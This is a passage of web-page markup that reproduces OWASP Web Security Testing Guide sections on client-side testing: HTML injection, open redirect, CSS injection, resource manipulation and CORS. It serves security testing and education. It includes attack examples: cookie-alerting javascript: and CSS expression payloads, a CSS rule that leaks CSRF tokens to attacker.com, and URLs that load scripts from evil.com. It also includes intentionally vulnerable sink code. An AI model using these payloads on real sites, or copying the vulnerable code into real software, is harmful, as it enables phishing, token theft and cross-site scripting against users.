                <span class="nx">$</span><span class="p">(</span><span class="nb">window</span><span class="p">).</span><span class="nx">bind</span><span class="p">(</span><span class="dl">"</span><span class="s2">hashchange</span><span class="dl">"</span><span class="p">,</span><span class="nx">setMessage</span><span class="p">)</span>
                <span class="nt">&lt;/script&gt;</span>
                <span class="nt">&lt;body&gt;</span>
                    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"../js/embed.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                    <span class="nt">&lt;span&gt;&lt;a</span> <span class="na">href=</span><span class="s">"#message"</span> <span class="nt">&gt;</span> Show Here<span class="nt">&lt;/a&gt;&lt;div</span> <span class="na">id=</span><span class="s">"message"</span><span class="nt">&gt;</span>Showing Message1<span class="nt">&lt;/div&gt;&lt;/span&gt;</span>
                    <span class="nt">&lt;span&gt;&lt;a</span> <span class="na">href=</span><span class="s">"#message1"</span> <span class="nt">&gt;</span> Show Here<span class="nt">&lt;/a&gt;&lt;div</span> <span class="na">id=</span><span class="s">"message1"</span><span class="nt">&gt;</span>Showing Message2<span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;span&gt;&lt;a</span> <span class="na">href=</span><span class="s">"#message2"</span> <span class="nt">&gt;</span> Show Here<span class="nt">&lt;/a&gt;&lt;div</span> <span class="na">id=</span><span class="s">"message2"</span><span class="nt">&gt;</span>Showing Message3<span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/body&gt;</span>
                </code></pre></div></div>
                
                <p>It is possible to inject HTML code.</p>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt4Modal" tabindex="-1" role="dialog" aria-labelledby="clnt4ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt4ModalLabel">WSTG-CLNT-04 - Testing for Client-side URL Redirect</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>This section describes how to check for client-side URL redirection, also known as open redirection. It is an input validation flaw that exists when an application accepts user-controlled input that specifies a link which leads to an external URL that could be malicious. This kind of vulnerability could be used to accomplish a phishing attack or redirect a victim to an infection page.</p>
                
                <p>This vulnerability occurs when an application accepts untrusted input that contains a URL value and does not sanitize it. This URL value could cause the web application to redirect the user to another page, such as a malicious page controlled by the attacker.</p>
                
                <p>This vulnerability may enable an attacker to successfully launch a phishing scam and steal user credentials. Since the redirection is originated by the real application, the phishing attempts may have a more trustworthy appearance.</p>
                
                <p>Here is an example of a phishing attack URL.</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.target.site?#redirect=www.fake-target.site
                </code></pre></div></div>
                
                <p>The victim that visits this URL will be automatically redirected to <code class="language-plaintext highlighter-rouge">fake-target.site</code>, where an attacker could place a fake page that resembles the intended site, in order to steal the victim’s credentials.</p>
                
                <p>Open redirection could also be used to craft a URL that would bypass the application’s access control checks and forward the attacker to privileged functions that they would normally not be able to access.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify injection points that handle URLs or paths.</li>
                  <li>Assess the locations that the system could redirect to.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>When testers manually check for this type of vulnerability, they first identify if there are client-side redirections implemented in the client-side code. These redirections may be implemented, to give a JavaScript example, using the <code class="language-plaintext highlighter-rouge">window.location</code> object. This can be used to direct the browser to another page by simply assigning a string to it. This is demonstrated in the following snippet:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">redir</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">redir</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">http://</span><span class="dl">'</span><span class="o">+</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">redir</span><span class="p">);</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
                <p>In this example, the script does not perform any validation of the variable <code class="language-plaintext highlighter-rouge">redir</code> which contains the user-supplied input via the query string. Since no form of encoding is applied, this unvalidated input is passed to the <code class="language-plaintext highlighter-rouge">windows.location</code> object, creating a URL redirection vulnerability.</p>
                
                <p>This implies that an attacker could redirect the victim to a malicious site simply by submitting the following query string:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.victim.site/?#www.malicious.site
                </code></pre></div></div>
                
                <p>With a slight modification, the above example snippet can be vulnerable to JavaScript injection.</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">redir</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">redir</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">redir</span><span class="p">);</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
                <p>This can be exploited by submitting the following query string:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.victim.site/?#javascript:alert(document.cookie)
                </code></pre></div></div>
                
                <p>When testing for this vulnerability, consider that some characters are treated differently by different browsers. For reference, see <a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">DOM-based XSS</a>.</p>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt5Modal" tabindex="-1" role="dialog" aria-labelledby="clnt5ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt5ModalLabel">WSTG-CLNT-05 - Testing for CSS Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>A CSS Injection vulnerability involves the ability to inject arbitrary CSS code in the context of a trusted web site which is rendered inside a victim’s browser. The impact of this type of vulnerability varies based on the supplied CSS payload. It may lead to cross site scripting or data exfiltration.</p>
                
                <p>This vulnerability occurs when the application allows user-supplied CSS to interfere with the application’s legitimate style sheets. Injecting code in the CSS context may provide an attacker with the ability to execute JavaScript in certain conditions, or to extract sensitive values using CSS selectors and functions able to generate HTTP requests. Generally, allowing users the ability to customize pages by supplying custom CSS files is a considerable risk.</p>
                
                <p>The following JavaScript code shows a possible vulnerable script in which the attacker is able to control the <code class="language-plaintext highlighter-rouge">location.hash</code> (source) which reaches the <code class="language-plaintext highlighter-rouge">cssText</code> function (sink). This particular case may lead to DOM-based XSS in older browser versions; for more information, see the <a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">DOM-based XSS Prevention Cheat Sheet</a>.</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"a1"</span><span class="nt">&gt;</span>Click me<span class="nt">&lt;/a&gt;</span>
                <span class="nt">&lt;script&gt;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">a1</span><span class="dl">"</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">cssText</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">color: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>The attacker could target the victim by asking them to visit the following URLs:</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">www.victim.com/#red;-o-link:'&lt;javascript:alert(1)&gt;';-o-link-source:current;</code> (Opera [8,12])</li>
                  <li><code class="language-plaintext highlighter-rouge">www.victim.com/#red;-:expression(alert(URL=1));</code> (IE 7/8)</li>
                </ul>
                
                <p>The same vulnerability may appear in the case of reflected XSS, for example, in the following PHP code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;style&gt;</span>
                <span class="nt">p</span> <span class="p">{</span>
                    <span class="nl">color</span><span class="p">:</span> <span class="err">&lt;?</span><span class="n">php</span> <span class="n">echo</span> <span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s2">'color'</span><span class="p">];</span> <span class="err">?&gt;;</span>
                    <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nt">&lt;/style&gt;</span>
                </code></pre></div></div>
                
                <p>Further attack scenarios involve the ability to extract data through the adoption of pure CSS rules. Such attacks can be conducted through CSS selectors, leading to the exfiltration of data, for example, CSRF tokens.</p>
                
                <p>Here is an example of code that attempts to select an input with a <code class="language-plaintext highlighter-rouge">name</code> matching <code class="language-plaintext highlighter-rouge">csrf_token</code> and a <code class="language-plaintext highlighter-rouge">value</code> beginning with an <code class="language-plaintext highlighter-rouge">a</code>. By utilizing a brute-force attack to determine the attribute’s <code class="language-plaintext highlighter-rouge">value</code>, it is possible to carry out an attack that sends the value to the attacker’s domain, such as by attempting to set a background image on the selected input element.</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;style&gt;</span>
                <span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="nt">csrf_token</span><span class="o">][</span><span class="nt">value</span><span class="o">=^</span><span class="nt">a</span><span class="o">]</span> <span class="p">{</span>
                    <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url(http://attacker.com/log?a)</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nt">&lt;/style&gt;</span>
                </code></pre></div></div>
                
                <p>Other attacks using solicited content such as CSS are highlighted in <a href="https://www.youtube.com/watch?v=FIQvAaZj_HA">Mario Heiderich’s talk, “Got Your Nose”</a> on YouTube.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify CSS injection points.</li>
                  <li>Assess the impact of the injection.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>Code should be analyzed to determine if a user is permitted to inject content in the CSS context. Particularly, the way in which the website returns CSS rules on the basis of the inputs should be inspected.</p>
                
                <p>The following is a basic example:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"a1"</span><span class="nt">&gt;</span>Click me<span class="nt">&lt;/a&gt;</span>
                <span class="nt">&lt;b&gt;</span>Hi<span class="nt">&lt;/b&gt;</span>
                <span class="nt">&lt;script&gt;</span>
                    <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
                        <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">b</span><span class="dl">"</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">style</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">color: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
                    <span class="p">});</span>
                <span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>The above code contains a source <code class="language-plaintext highlighter-rouge">location.hash</code>, controlled by the attacker, that can inject directly in the <code class="language-plaintext highlighter-rouge">style</code> attribute of an HTML element. As mentioned above, this may lead to different results depending on the browser in use and the supplied payload.</p>
                
                <p>The following pages provide examples of CSS injection vulnerabilities:</p>
                
                <ul>
                  <li><a href="http://html5sec.org/invalid/?length=25">Password “cracker” via CSS and HTML5</a></li>
                  <li><a href="http://eaea.sirdarckcat.net/cssar/v2/">CSS attribute reading</a></li>
                  <li><a href="https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink">JavaScript based attacks using <code class="language-plaintext highlighter-rouge">CSSStyleDeclaration</code> with unescaped input</a></li>
                </ul>
                
                <p>For further OWASP resources on preventing CSS injection, see the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html">Securing Cascading Style Sheets Cheat Sheet</a>.</p>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt6Modal" tabindex="-1" role="dialog" aria-labelledby="clnt6ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt6ModalLabel">WSTG-CLNT-06 - Testing for Client-side Resource Manipulation</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>A client-side resource manipulation vulnerability is an input validation flaw. It occurs when an application accepts user-controlled input that specifies the path of a resource such as the source of an iframe, JavaScript, applet, or the handler of an XMLHttpRequest. This vulnerability consists of the ability to control the URLs that link to some resources present in a web page. The impact of this vulnerability varies, and it is usually adopted to conduct XSS attacks. This vulnerability makes it is possible to interfere with the expected application’s behavior by causing it to load and render malicious objects.</p>
                
                <p>The following JavaScript code shows a possible vulnerable script in which an attacker is able to control the <code class="language-plaintext highlighter-rouge">location.hash</code> (source) which reaches the attribute <code class="language-plaintext highlighter-rouge">src</code> of a script element. This particular case leads to a XSS attack as external JavaScript could be injected.</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                    <span class="kd">var</span> <span class="nx">d</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">script</span><span class="dl">"</span><span class="p">);</span>
                    <span class="k">if</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nx">d</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">d</span><span class="p">);</span>
                <span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>An attacker could target a victim by causing them to visit this URL:</p>
                
                <p><code class="language-plaintext highlighter-rouge">www.victim.com/#http://evil.com/js.js</code></p>
                
                <p>Where <code class="language-plaintext highlighter-rouge">js.js</code> contains:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span>
                </code></pre></div></div>
                
                <p>This would cause the alert to pop up on the victim’s browser.</p>
                
                <p>A more damaging scenario involves the possibility of controlling the URL called in a CORS request. Since CORS allows the target resource to be accessible by the requesting domain through a header-based approach, the attacker may ask the target page to load malicious content from its own website.</p>
                
                <p>Here is an example of a vulnerable page:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;b</span> <span class="na">id=</span><span class="s">"p"</span><span class="nt">&gt;&lt;/b&gt;</span>
                <span class="nt">&lt;script&gt;</span>
                    <span class="kd">function</span> <span class="nx">createCORSRequest</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span> <span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
                        <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                        <span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
                                <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
                            <span class="p">}</span>
                        <span class="p">};</span>
                        <span class="k">return</span> <span class="nx">xhr</span><span class="p">;</span>
                    <span class="p">}</span>
                
                    <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="nx">createCORSRequest</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
                    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
                <span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>The <code class="language-plaintext highlighter-rouge">location.hash</code> is controlled by user input and is used for requesting an external resource, which will then be reflected through the construct <code class="language-plaintext highlighter-rouge">innerHTML</code>. An attacker could ask a victim to visit the following URL:</p>
                
                <p><code class="language-plaintext highlighter-rouge">www.victim.com/#http://evil.com/html.html</code></p>
                
                <p>With the payload handler for <code class="language-plaintext highlighter-rouge">html.html</code>:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php
                header('Access-Control-Allow-Origin: http://www.victim.com');
                ?&gt;</span>
                <span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify sinks with weak input validation.</li>
                  <li>Assess the impact of the resource manipulation.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>To manually check for this type of vulnerability, we must identify whether the application employs inputs without correctly validating them. If so, these inputs are under the control of the user and could be used to specify external resources. Since there are many resources that could be included in the application (such as images, video, objects, css, and iframes), the client-side scripts that handle the associated URLs should be investigated for potential issues.</p>
                
                <p>The following table shows possible injection points (sink) that should be checked:</p>
                
                <table>
                  <thead>
                    <tr>
                      <th>Resource Type</th>
                      <th>Tag/Method</th>
                      <th>Sink</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>Frame</td>
                      <td>iframe</td>
                      <td>src</td>
                    </tr>
                    <tr>
                      <td>Link</td>
                      <td>a</td>
                      <td>href</td>
                    </tr>
                    <tr>
                      <td>AJAX Request</td>
                      <td><code class="language-plaintext highlighter-rouge">xhr.open(method, [url], true);</code></td>
                      <td>URL</td>
                    </tr>
                    <tr>
                      <td>CSS</td>
                      <td>link</td>
                      <td>href</td>
                    </tr>
                    <tr>
                      <td>Image</td>
                      <td>img</td>
                      <td>src</td>
                    </tr>
                    <tr>
                      <td>Object</td>
                      <td>object</td>
                      <td>data</td>
                    </tr>
                    <tr>
                      <td>Script</td>
                      <td>script</td>
                      <td>src</td>
                    </tr>
                  </tbody>
                </table>
                
                <p>The most interesting ones are those that allow to an attacker to include client-side code (for example JavaScript) that could lead to XSS vulnerabilities.</p>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt7Modal" tabindex="-1" role="dialog" aria-labelledby="clnt7ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt7ModalLabel">WSTG-CLNT-07 - Testing Cross Origin Resource Sharing</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p><a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">Cross origin resource sharing</a> (CORS) is a mechanism that enables a web browser to perform cross-domain requests using the XMLHttpRequest L2 API in a controlled manner. In the past, the XMLHttpRequest L1 API only allowed requests to be sent within the same origin as it was restricted by the same origin policy.</p>
                
                <p>Cross-origin requests have an origin header that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use between a web browser and a server to determine whether a cross-origin request is allowed. HTTP <a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers">headers</a> are used to accomplish this.</p>
                
                <p>The <a href="https://www.w3.org/TR/cors/">W3C CORS specification</a> mandates that for non simple requests, such as requests other than GET or POST or requests that uses credentials, a pre-flight OPTIONS request must be sent in advance to check if the type of request will have a bad impact on the data. The pre-flight request checks the methods and headers allowed by the server, and if credentials are permitted. Based on the result of the OPTIONS request, the browser decides whether the request is allowed or not.</p>
                
                <h3 id="origin--access-control-allow-origin">Origin &amp; Access-Control-Allow-Origin</h3>
                
                <p>The origin header is always sent by the browser in a CORS request and indicates the origin of the request. The origin header can not be changed from JavaScript however relying on this header for Access Control checks is not a good idea as it may be spoofed outside the browser, so you still need to check that application-level protocols are used to protect sensitive data.</p>
                
                <p>Access-Control-Allow-Origin is a response header used by a server to indicate which domains are allowed to read the response. Based on the CORS W3 Specification it is up to the client to determine and enforce the restriction of whether the client has access to the response data based on this header.</p>
                
                <p>From a penetration testing perspective you should look for insecure configurations as for example using a <code class="language-plaintext highlighter-rouge">*</code> wildcard as value of the Access-Control-Allow-Origin header that means all domains are allowed. Other insecure example is when the server returns back the origin header without any additional checks, what can lead to access of sensitive data. Note that this configuration is very insecure, and is not acceptable in general terms, except in the case of a public API that is intended to be accessible by everyone.</p>
                
                <h3 id="access-control-request-method--access-control-allow-method">Access-Control-Request-Method &amp; Access-Control-Allow-Method</h3>
                
                <p>The Access-Control-Request-Method header is used when a browser performs a preflight OPTIONS request and let the client indicate the request method of the final request. On the other hand, the Access-Control-Allow-Method is a response header used by the server to describe the methods the clients are allowed to use.</p>
                
                <h3 id="access-control-request-headers--access-control-allow-headers">Access-Control-Request-Headers &amp; Access-Control-Allow-Headers</h3>
                
                <p>These two headers are used between the browser and the server to determine which headers can be used to perform a cross-origin request.</p>
                
                <h3 id="access-control-allow-credentials">Access-Control-Allow-Credentials</h3>
                
                <p>This header as part of a preflight request indicates that the final request can include user credentials.</p>
                
                <h3 id="input-validation">Input Validation</h3>
                
                <p>XMLHttpRequest L2 (or XHR L2) introduces the possibility of creating a cross-domain request using the XHR API for backwards compatibility. This can introduce security vulnerabilities that in XHR L1 were not present. Interesting points of the code to exploit would be URLs that are passed to XMLHttpRequest without validation, specially if absolute URLs are allowed because that could lead to code injection. Likewise, other part of the application that can be exploited is if the response data is not escaped and we can control it by providing user-supplied input.</p>
                
                <h3 id="other-headers">Other Headers</h3>
                
                <p>There are other headers involved like Access-Control-Max-Age that determines the time a preflight request can be cached in the browser, or Access-Control-Expose-Headers that indicates which headers are safe to expose to the API of a CORS API specification, both are response headers specified in the CORS W3C document.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify endpoints that implement CORS.</li>
                  <li>Ensure that the CORS configuration is secure or harmless.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>A tool such as <a href="https://www.zaproxy.org">ZAP</a> can enable testers to intercept HTTP headers, which can reveal how CORS is used. Testers should pay particular attention to the origin header to learn which domains are allowed. Also, manual inspection of the JavaScript is needed to determine whether the code is vulnerable to code injection due to improper handling of user supplied input. Below are some examples:</p>
                
                <h3 id="example-1-insecure-response-with-wildcard--in-access-control-allow-origin">Example 1: Insecure Response with Wildcard <code class="language-plaintext highlighter-rouge">*</code> in Access-Control-Allow-Origin</h3>
                
                <p>Request <code class="language-plaintext highlighter-rouge">http://attacker.bar/test.php</code> (note the ‘origin’ header):</p>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/test.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
                <span class="na">Host</span><span class="p">:</span> <span class="s">attacker.bar</span>
                <span class="s">[...]</span>
                <span class="na">Referer</span><span class="p">:</span> <span class="s">http://example.foo/CORSexample1.html</span>
                <span class="na">Origin</span><span class="p">:</span> <span class="s">http://example.foo</span>
                <span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
                </code></pre></div></div>
                
                <p>Response (note the ‘Access-Control-Allow-Origin’ header:)</p>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
                <span class="s">[...]</span>
                <span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">*</span>
                <span class="na">Content-Length</span><span class="p">:</span> <span class="s">4</span>
                <span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/xml</span>
                
                [Response Body]
                </code></pre></div></div>
                
                <h3 id="example-2-input-validation-issue-xss-with-cors">Example 2: Input Validation Issue: XSS with CORS</h3>
                
                <p>This code makes a request to the resource passed after the <code class="language-plaintext highlighter-rouge">#</code> character in the URL, initially used to get resources in the same server.</p>
                
                <p>Vulnerable code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                    <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
                
                    <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                        <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span><span class="o">==</span><span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span><span class="o">==</span><span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">div1</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="o">=</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                
                    <span class="kd">var</span> <span class="nx">resource</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
                    <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="nx">resource</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
                    <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
                <span class="nt">&lt;/script&gt;</span>
                
                <span class="nt">&lt;body&gt;</span>
